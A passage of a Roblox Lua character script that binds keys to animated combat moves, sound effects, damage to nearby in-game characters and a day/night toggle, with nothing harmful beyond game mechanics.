outm.MeshId = "http://www.roblox.com/asset/?id=1033714"
outm.Scale = Vector3.new(4, 4, 4)
local bnd = Instance.new("Part", char)
bnd.Anchored = true
bnd.BrickColor = BrickColor.new("Institutional white")
bnd.CanCollide = false
bnd.FormFactor = 3
bnd.Name = "Bend"
bnd.Size = Vector3.new(1, 1, 1)
bnd.Transparency = 1
bnd.TopSurface = 0
bnd.BottomSurface = 0
local bndm = Instance.new("SpecialMesh", bnd)
bndm.MeshType = 3
bndm.Scale = Vector3.new(8, 8, 8)
out.CFrame = larm.CFrame * CFrame.new(0, -2.7, 0)
bem.CFrame = out.CFrame * CFrame.new(0, -2.5, 0) * CFrame.Angles(0, 0, math.rad(90))
bnd.CFrame = bem.CFrame * CFrame.new(0, 0, 0)
rng.CFrame = out.CFrame * CFrame.Angles(math.rad(90), 0, 0)
rng3.CFrame = rng.CFrame * CFrame.new(0, -.5, 0)
rng4.CFrame = rng3.CFrame * CFrame.new(0, -.5, 0)
Debounces.Shewt = true
coroutine.wrap(function()
for i = 1, 20, 0.2 do
rngm.Scale = Vector3.new(10 + i*2, 10 + i*2, 1)
rngm3.Scale = Vector3.new(8 + i*2, 8 + i*2, 1)
rngm4.Scale = Vector3.new(6 + i*2, 6 + i*2, 1)
rng.Transparency = i/20
rng3.Transparency = 1/16
rng4.Transparency = i/12
wait()
end
wait()
rng:Destroy()
end)()
if Debounces.Shewt == true then
char:WaitForChild("Beam" .. shot).Touched:connect(function(ht)
hit = ht.Parent
if hit:IsA("Model") and hit:findFirstChild("Humanoid") then
if HasntTouched(hit.Name) == true and deb == false then
deb = true
coroutine.wrap(function()
hit:FindFirstChild("Humanoid").PlatformStand = true
hit:FindFirstChild("Torso").Velocity = char.Head.CFrame.lookVector * 180
hit:FindFirstChild("Humanoid"):TakeDamage(math.random(24,73))
end)()
table.insert(Touche, hit.Name)
deb = false
end
elseif hit:IsA("Hat") and hit.Parent:findFirstChild("Humanoid") then
if HasntTouched(hit.Parent.Name) == true and deb == false then
deb = true
coroutine.wrap(function()
hit.Parent:FindFirstChild("Humanoid").PlatformStand = true
hit.Parent:FindFirstChild("Torso").Velocity = char.Head.CFrame.lookVector * 180
wait(1)
hit.Parent:FindFirstChild("Humanoid").PlatformStand = false
end)()
table.insert(Touche, hit.Parent.Name)
deb = false
for i, v in pairs(Touche) do
print(v)
end
end
end
end)
end
for i = 0, 260, 8 do
bem.Size = Vector3.new(i, 2, 2)
bem.CFrame = larm.CFrame * CFrame.new(0, -4.2 -(i/2), 0) * CFrame.Angles(0, 0, math.rad(90))
bnd.CFrame = bem.CFrame * CFrame.new(-i/2, 0, 1.2)
bnd.Size = Vector3.new(1,1,1)
bndm.Scale = Vector3.new(8,8,8)
if i % 10 == 0 then
local newRng = rng2:Clone()
newRng.Parent = char
newRng.CFrame = larm.CFrame * CFrame.new(0, -4.2-i, 0) * CFrame.Angles(math.rad(90), 0, 0)
local newRngm = rngm2:clone()
newRngm.Parent=newRng
coroutine.wrap(function()
for i = 1, 10, 0.2 do
newRngm.Scale = Vector3.new(8 + i*2, 8 + i*2, 1)
newRng.Transparency = i/10
wait()
end
wait()
newRng:Destroy()
end)()
end
wait()
end
wait()
Debounces.Shewt = false
bem:Destroy()
out:Destroy()
bnd:Destroy()
Debounces.Ready = false
for i, v in pairs(Touche) do
table.remove(Touche, i)
end
wait()
table.insert(Touche, char.Name)
Debounces.NoIdl = false
if Debounces.CanAttack == false then
Debounces.CanAttack = true
end
end
end
end)
----------------------------------------------------
sidz = {"231917888", "231917845", "231917806"}
ptz = {0.65, 0.7, 0.75, 0.8, 0.95, 1}
mouse.KeyDown:connect(function(key)
    if key == "f" then
    larm.BrickColor = BrickColor.new("Bright red")
    rarm.BrickColor = BrickColor.new("Bright red")
        if Debounces.CanAttack == true then
            Debounces.CanAttack = false
            Debounces.on = true
            Debounces.NoIdl = true
                for i = 1, 10 do
                    rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(2.4, 2.4, 0)*CFrame.Angles(math.rad(170),math.rad(0),math.rad(-34)), 0.4)
                    larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.4, 2.4, 0)*CFrame.Angles(math.rad(170),math.rad(0),math.rad(34)), 0.4)
                    hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, .2)*CFrame.Angles(math.rad(16),math.rad(0),0), 0.4)
                    torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(math.rad(20), math.rad(0), 0), 0.4)
                    lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, 0) * CFrame.Angles(math.rad(-20), math.rad(0), math.rad(0)), 0.4)
                    rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -2, -1.4) * CFrame.Angles(math.rad(-20), math.rad(0), math.rad(0)), 0.4)
                    cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.5, -.9) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
                    if Debounces.on == false then break end
                    wait()
                end
                z = Instance.new("Sound",char)
                z.SoundId = "rbxassetid://"..sidz[math.random(1,#sidz)]
                z.Pitch = ptz[math.random(1,#ptz)]
                z.Volume = 1
                z1 = Instance.new("Sound",char)
                z1.SoundId = z.SoundId
                z1.Pitch = z.Pitch
                z1.Volume = 1
                wait(1)
                z:Play()
                z1:Play()
                Stomp()
                for i = 1, 20 do
                    rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, 0.9, .4)*CFrame.Angles(math.rad(-50),math.rad(0),math.rad(28)), 0.6)
                    larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, 0.9, .4)*CFrame.Angles(math.rad(-50),math.rad(0),math.rad(-28)), 0.6)
                    hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, -.2)*CFrame.Angles(math.rad(-26),math.rad(0),0), 0.6)
                    torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, -.6) * CFrame.Angles(math.rad(-30), math.rad(0), 0), 0.6)
                    lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, 0) * CFrame.Angles(math.rad(30), 0, math.rad(0)), 0.6)
                    rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -2.8, -1.4) * CFrame.Angles(math.rad(30), 0, math.rad(0)), 0.6)
                    cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.5, -.9) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
                    if Debounces.on == false then break end
                    wait()
                end
        if Debounces.CanAttack == false then
            Debounces.CanAttack = true
            Debounces.on = false
            Debounces.NoIdl = false
            larm.BrickColor = BrickColor.new("Institutional white")
            rarm.BrickColor = BrickColor.new("Institutional white")
            end
        end
    end
end)    
----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if key == "g" then
    larm.BrickColor = BrickColor.new("Bright red")
    rarm.BrickColor = BrickColor.new("Bright red")
        if Debounces.CanAttack == true then
        Debounces.CanAttack = false
        Debounces.on = true
        Debounces.NoIdl = true
        chrg = lleg.Touched:connect(function(ht)
        hit = ht.Parent
            if ht and hit:IsA("Model") then
                    if hit:FindFirstChild("Humanoid") then
                        if hit.Name ~= p.Name then
                            --[[if Debounces.Slashing == true and Debounces.Slashed == false then
                                    Debounces.Slashed = true]]--
                                    hit:FindFirstChild("Humanoid"):TakeDamage(2)
                                    hit:FindFirstChild("Humanoid").PlatformStand = true
                                    hit:FindFirstChild("Torso").Velocity = hit:FindFirstChild("Torso").CFrame.lookVector * -70
                                    --Debounces.Slashed = false
                            --end
                        end
                    end
            elseif ht and hit:IsA("Hat") then
                if hit.Parent.Name ~= p.Name then
                    if hit.Parent:FindFirstChild("Humanoid") then
                           --[[ if Debounces.Slashing == true and Debounces.Slashed == false then
                                    Debounces.Slashed = true]]--
                                    hit.Parent:FindFirstChild("Humanoid"):TakeDamage(2)
                                    hit:FindFirstChild("Humanoid").PlatformStand = true
                                    hit:FindFirstChild("Torso").Velocity = hit:FindFirstChild("Torso").CFrame.lookVector * -70
                        --Debounces.Slashed = false
                    end
                end
            end    
        end)
        for i = 1, 14 do
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, .9, 0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(30)), 0.5)
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.6, .9, -.4)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(50)), 0.5)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, -.2)*CFrame.Angles(math.rad(0),math.rad(90),math.rad(0)), 0.5)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(math.rad(0), math.rad(-90), math.rad(0)), 0.5)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-.8, -3, 0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(15)), 0.5)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -3, 0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(15)), 0.5)
            cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.3, -1.1) * CFrame.Angles(math.rad(-60), math.rad(-90), math.rad(0)), 0.9)
            if Debounces.on == false then break end
            wait()
        end
        charge()
        z = Instance.new("Sound",char)
        z.SoundId = "rbxassetid://200632875"
        z.Volume = 1
        z.Pitch = .8
        z1 = Instance.new("Sound",char)
        z1.SoundId = "rbxassetid://200632875"
        z1.Volume = 1
        z1.Pitch = .9
        z:Play()
        z1:Play()
        wait(1)
        z:Destroy()
        z1:Destroy()
        chrg:disconnect()
        if Debounces.CanAttack == false then
            Debounces.CanAttack = true
            Debounces.on = false
            Debounces.NoIdl = false
            larm.BrickColor = BrickColor.new("Institutional white")
            rarm.BrickColor = BrickColor.new("Institutional white")
            end
        end
    end
end)
----------------------------------------------------
pt = {0.7, 0.8, 0.9}
mouse.KeyDown:connect(function(key)
    if key == "h" then
        if Debounces.CanJoke == true then
            Debounces.CanJoke = false
            u = Instance.new("Sound")
            u.SoundId = "http://www.roblox.com/asset/?id=333446256"
            u.Parent = char
            u.Looped = false
            u.Pitch = pt[math.random(1,#pt)]
            u.Volume = 1
            u2 = Instance.new("Sound")
            u2.SoundId = "http://www.roblox.com/asset/?id=333446256"
            u2.Parent = char
            u2.Looped = false
            u2.Pitch = u.Pitch
            u2.Volume = 1
            wait(.01)
            u:Play()
            u2:Play()
            wait(6)
            u:Destroy()
            u2:Destroy()
            if Debounces.CanJoke == false then
                Debounces.CanJoke = true
            end
        end
    end
end)
----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if key == "l" then
			if Debounces.CanJoke == true then
				Debounces.CanJoke = false
                z = Instance.new("Sound",char)
                z.SoundId = "rbxassetid://233774928"
                z.Pitch = .76
                z.Volume = 1
				wait()
				z:Play()
				wait(6)
				z:Destroy()
			if Debounces.CanJoke == false then
				Debounces.CanJoke = true
			end
		end
	end
end)
----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if key == "j" then
			if Debounces.CanJoke == true then
				Debounces.CanJoke = false
                z = Instance.new("Sound",char)
                z.SoundId = "rbxassetid://135017456"
                z.Pitch = .76
                z.Volume = 1
				wait()
				z:Play()
				wait(6)
				z:Destroy()
			if Debounces.CanJoke == false then
				Debounces.CanJoke = true
			end
		end
	end
end)
----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if key == "n" then
			if Debounces.CanJoke == true then
				Debounces.CanJoke = false
                z = Instance.new("Sound",char)
                z.SoundId = "rbxassetid://130792236"
                z.Pitch = .76
                z.Volume = 1
				wait()
				z:Play()
				wait(6)
				z:Destroy()
			if Debounces.CanJoke == false then
				Debounces.CanJoke = true
			end
		end
	end
end)
----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if key == "k" then
			if Debounces.CanJoke == true then
				Debounces.CanJoke = false
                z = Instance.new("Sound",char)
                z.SoundId = "rbxassetid://135014184"
                z.Pitch = .76
                z.Volume = 1
				wait()
				z:Play()
				wait(4)
				z:Destroy()
			if Debounces.CanJoke == false then
				Debounces.CanJoke = true
			end
		end
	end
end)
----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if key == "x" then
        if Debounces.CanAttack == true then
            Debounces.CanAttack = false
            Debounces.NoIdl = true
            Debounces.on = true
            Debounces.ks = true
        for i = 1, 10 do
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,0)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(20)), 0.6)
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.7,.9,-.5)*CFrame.Angles(math.rad(40),math.rad(0),math.rad(20)), 0.6)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.4)*CFrame.Angles(math.rad(-26),math.rad(0),0), 0.6)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(math.rad(-10), math.rad(0), 0), 0.6)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.6)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -2.7, .6) * CFrame.Angles(math.rad(-70), math.rad(0), math.rad(0)), 0.6)
            cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
            if Debounces.on == false then break end
            wait()
        end
        z = Instance.new("Sound",hed)
        z.SoundId = "rbxassetid://169445092"
        z.Volume = 1
        wait(0.1)
        z:Play()
        kik = rleg.Touched:connect(function(ht)
        hit = ht.Parent
            if ht and hit:IsA("Model") then
                    if hit:FindFirstChild("Humanoid") then
                        if hit.Name ~= p.Name then
                            --[[if Debounces.Slashing == true and Debounces.Slashed == false then
                                    Debounces.Slashed = true]]--
                                    if Debounces.ks==true then
                                    z = Instance.new("Sound",hed)
                                    z.SoundId = "rbxassetid://169380525"
                                    z.Volume = 1
                                    z:Play()
                                    Debounces.ks=false
                                    end
                                    hit:FindFirstChild("Humanoid"):TakeDamage(2)
                                    hit:FindFirstChild("Humanoid").PlatformStand = true
                                    hit:FindFirstChild("Torso").Velocity = hit:FindFirstChild("Torso").CFrame.lookVector * -70
                            --Debounces.Slashed = false
                        --end
                    end
                end
            elseif ht and hit:IsA("Hat") then
                if hit.Parent.Name ~= p.Name then
                    if hit.Parent:FindFirstChild("Humanoid") then
                           --[[if Debounces.Slashing == true and Debounces.Slashed == false then
                                    Debounces.Slashed = true]]--
                                    hit.Parent:FindFirstChild("Humanoid"):TakeDamage(2)
                                    hit:FindFirstChild("Humanoid").PlatformStand = true
                                    hit:FindFirstChild("Torso").Velocity = hit:FindFirstChild("Torso").CFrame.lookVector * -70
                            --Debounces.Slashed = false
                        --end
                    end
                end
            end    
        end)
        for i = 1, 8 do
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,0)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(20)), 0.7)
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3,.9,0)*CFrame.Angles(math.rad(-50),math.rad(0),math.rad(-20)), 0.7)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,.2)*CFrame.Angles(math.rad(8),math.rad(0),0), 0.7)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.2, 0) * CFrame.Angles(math.rad(16), math.rad(0), 0), 0.7)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, 0) * CFrame.Angles(math.rad(-16), math.rad(0), math.rad(0)), 0.7)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -2.6, -1.4) * CFrame.Angles(math.rad(60), math.rad(0), math.rad(0)), 0.7)
            cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
            if Debounces.on == false then break end
            wait()
        end
        kik:disconnect()
        if Debounces.CanAttack == false then
            Debounces.CanAttack = true
            Debounces.on = false
            Debounces.NoIdl = false
            end
        end
    end
end)
----------------------------------------------------
mouse.KeyDown:connect(function(key)
    if key == "c" then
        if Debounces.CanAttack == true then
            Debounces.CanAttack = false
            Debounces.NoIdl = true
            Debounces.on = true
            SIDZ = {"231917744", "231917742"}
            PTZ = {0.7, 0.8, 0.9, 1}
                for i = 1, 20 do
                    wait()
                        for i,v in pairs(char.Absolution:children()) do
                    if v:IsA("Part") or v:IsA("WedgePart") then
                        v.Transparency = v.Transparency + 0.05
                        end
                    end
                end
                function FindNearestTorso(Position,Distance,SinglePlayer)
                    if SinglePlayer then return(SinglePlayer.Torso.CFrame.p -Position).magnitude < Distance end
                        local List = {}
                        for i,v in pairs(workspace:GetChildren())do
                            if v:IsA("Model")then
                                if v:findFirstChild("Torso")then
                                    if v ~= char then
                                        if(v.Torso.Position -Position).magnitude <= Distance then
                                            table.insert(List,v)
                                        end 
                                    end 
                                end 
                            end 
                        end
                    return List
                end
                GroundPound()
                for i = 1, 5 do
                    rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,1)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(50)), 0.7)
                    larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.2,.9,-2.2)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(20)), 0.7)
                    hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2)*CFrame.Angles(math.rad(-14),math.rad(20),0), 0.6)
                    torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -2.2, 0) * CFrame.Angles(math.rad(-80), math.rad(-20), 0), 0.6)
                    lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -2, -.4) * CFrame.Angles(math.rad(80), 0, math.rad(-30)), 0.6)
                    rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -2, -1) * CFrame.Angles(math.rad(80), 0, math.rad(10)), 0.6)
                    cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
                    if Debounces.on == false then break end
                    wait()
                end
                GroundPound()
                for i = 1, 5 do
                    rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(2.2,.9,-2.2)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(-20)), 0.7)
                    larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3,.9,1)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(-50)), 0.7)
                    hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2)*CFrame.Angles(math.rad(-14),math.rad(-20),0), 0.6)
                    torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -2.2, 0) * CFrame.Angles(math.rad(-80), math.rad(20), 0), 0.6)
                    lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -2, -1) * CFrame.Angles(math.rad(80), 0, math.rad(10)), 0.6)
                    rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -2, -.4) * CFrame.Angles(math.rad(80), 0, math.rad(30)), 0.6)
                    cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
                    if Debounces.on == false then break end
                    wait()
                end
                GroundPound()
                for i = 1, 5 do
                    rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,1)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(50)), 0.7)
                    larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.2,.9,-2.2)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(20)), 0.7)
                    hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2)*CFrame.Angles(math.rad(-14),math.rad(20),0), 0.6)
                    torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -2.2, 0) * CFrame.Angles(math.rad(-80), math.rad(-20), 0), 0.6)
                    lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -2, -.4) * CFrame.Angles(math.rad(80), 0, math.rad(-30)), 0.6)
                    rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -2, -1) * CFrame.Angles(math.rad(80), 0, math.rad(10)), 0.6)
                    cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
                    if Debounces.on == false then break end
                    wait()
                end
                GroundPound()
                for i = 1, 5 do
                    rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(2.2,.9,-2.2)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(-20)), 0.7)
                    larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3,.9,1)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(-50)), 0.7)
                    hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2)*CFrame.Angles(math.rad(-14),math.rad(-20),0), 0.6)
                    torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -2.2, 0) * CFrame.Angles(math.rad(-80), math.rad(20), 0), 0.6)
                    lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -2, -1) * CFrame.Angles(math.rad(80), 0, math.rad(10)), 0.6)
                    rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -2, -.4) * CFrame.Angles(math.rad(80), 0, math.rad(30)), 0.6)
                    cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
                    if Debounces.on == false then break end
                    wait()
                end
                GroundPound()
                for i = 1, 5 do
                    rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3,.9,1)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(50)), 0.7)
                    larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.2,.9,-2.2)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(20)), 0.7)
                    hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2)*CFrame.Angles(math.rad(-14),math.rad(20),0), 0.6)
                    torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -2.2, 0) * CFrame.Angles(math.rad(-80), math.rad(-20), 0), 0.6)
                    lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -2, -.4) * CFrame.Angles(math.rad(80), 0, math.rad(-30)), 0.6)
                    rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -2, -1) * CFrame.Angles(math.rad(80), 0, math.rad(10)), 0.6)
                    cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
                    if Debounces.on == false then break end
                    wait()
                end
                GroundPound()
                for i = 1, 5 do
                    rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(2.2,.9,-2.2)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(-20)), 0.7)
                    larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3,.9,1)*CFrame.Angles(math.rad(90),math.rad(0),math.rad(-50)), 0.7)
                    hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0,3,-.2)*CFrame.Angles(math.rad(-14),math.rad(-20),0), 0.6)
                    torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -2.2, 0) * CFrame.Angles(math.rad(-80), math.rad(20), 0), 0.6)
                    lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1.2, -2, -1) * CFrame.Angles(math.rad(80), 0, math.rad(10)), 0.6)
                    rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1.2, -2, -.4) * CFrame.Angles(math.rad(80), 0, math.rad(30)), 0.6)
                    cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1, -1.1) * CFrame.Angles(math.rad(-90), math.rad(-110), math.rad(-70)), 1)
                    if Debounces.on == false then break end
                    wait()
                end
                for i = 1, 18 do
                    rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(2.4, 2.4, 0)*CFrame.Angles(math.rad(170),math.rad(0),math.rad(-10)), 0.4)
                    larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.4, 2.4, 0)*CFrame.Angles(math.rad(170),math.rad(0),math.rad(10)), 0.4)
                    hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, .2)*CFrame.Angles(math.rad(16),math.rad(0),0), 0.4)
                    torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, 2, 0) * CFrame.Angles(math.rad(20), math.rad(0), 0), 0.4)
                    lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, 0) * CFrame.Angles(math.rad(-20), math.rad(0), math.rad(0)), 0.4)
                    rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -2, -1.4) * CFrame.Angles(math.rad(-20), math.rad(0), math.rad(0)), 0.4)
                    cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.5, -.9) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
                    if Debounces.on == false then break end
                    wait()
                end
                for i,v in pairs(FindNearestTorso(torso.CFrame.p,25))do
                    if v:FindFirstChild('Humanoid') then
                        v.Humanoid:TakeDamage(math.random(20,60))
                        v.Humanoid.PlatformStand = true
                        v:FindFirstChild("Torso").Velocity = hed.CFrame.lookVector * 100
                    end
                end
                x = Instance.new("Sound",char)
                x.SoundId = "rbxassetid://"..SIDZ[math.random(1,#SIDZ)]
                x.Pitch = PTZ[math.random(1,#PTZ)]
                x.Volume = 1
                wait(0.1)
                x:Play()
                Crater(hed,20)
                for i = 1, 14 do
                    rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(2.4, 3.2, -.5)*CFrame.Angles(math.rad(160),math.rad(0),math.rad(-10)), 0.6)
                    larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-2.4, 3.2, -.5)*CFrame.Angles(math.rad(160),math.rad(0),math.rad(10)), 0.6)
                    hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, .2)*CFrame.Angles(math.rad(16),math.rad(0),0), 0.6)
                    torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -5, 0) * CFrame.Angles(math.rad(-90), math.rad(0), 0), 0.6)
                    lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, .4) * CFrame.Angles(math.rad(-20), math.rad(0), math.rad(0)), 0.6)
                    rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -2, .4) * CFrame.Angles(math.rad(-20), math.rad(0), math.rad(0)), 0.6)
                    cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.5, -.9) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
                    if Debounces.on == false then break end
                    wait()
                end
            if Debounces.CanAttack == false then
                Debounces.CanAttack = true
                Debounces.on = false
                Debounces.NoIdl = false
                for i = 1, 20 do
                    wait()
                        for i,v in pairs(char.Absolution:children()) do
                    if v:IsA("Part") or v:IsA("WedgePart") then
                        v.Transparency = v.Transparency - 0.05
                        end
                    end
                end
            end
        end
    end
end)
----------------------------------------------------176349813
mouse.KeyDown:connect(function(key)
    if key == "b" then
        hum.WalkSpeed = 0.01
        if Debounces.CanAttack == true then
            Debounces.CanAttack = false
            Debounces.NoIdl = true
            Debounces.on = true
            for i = 1,20 do
            rarm.Weld.C0 = Lerp(rarm.Weld.C0, CFrame.new(3, 1, 0) * CFrame.Angles(math.rad(75), 0, math.rad(-30)), 0.1)
            larm.Weld.C0 = Lerp(larm.Weld.C0, CFrame.new(-3, 1, 0) * CFrame.Angles(math.rad(75), 0, math.rad(30)), 0.1)
            hed.Weld.C0 = Lerp(hed.Weld.C0, CFrame.new(0, 3, 0) * CFrame.Angles(math.rad(-20), math.rad(0), 0), 0.1)
            torso.Weld.C0 = Lerp(torso.Weld.C0, CFrame.new(0, -1.1, 0) * CFrame.Angles(math.rad(-30), math.rad(0), 0), 0.1)
            lleg.Weld.C0 = Lerp(lleg.Weld.C0, CFrame.new(-1, -3, 0) * CFrame.Angles (math.rad(30), 0, math.rad(-5)), 0.1)
            rleg.Weld.C0 = Lerp(rleg.Weld.C0, CFrame.new(1, -3, 0) * CFrame.Angles (math.rad(30), 0, math.rad(5)), 0.1)
            cor.Weld.C0 = Lerp(cor.Weld.C0, CFrame.new(0, -1.85, -.9) * CFrame.Angles(math.rad(-90), math.rad(-90), math.rad(0)), 1)
            if Debounces.on == false then break end
            wait()
            end
        wait(1)
        v = Instance.new("Sound")
        v.SoundId = "rbxassetid://181384451"
        v.Parent = char
        v.Looped = false
        v.Pitch = 1.04
        v.Volume = 1
        wait(.01)
        v:Play()
        
        if Daytime == true then
            Daytime = false
            l.TimeOfDay = 24
        else
            Daytime = true
            l.TimeOfDay = 12
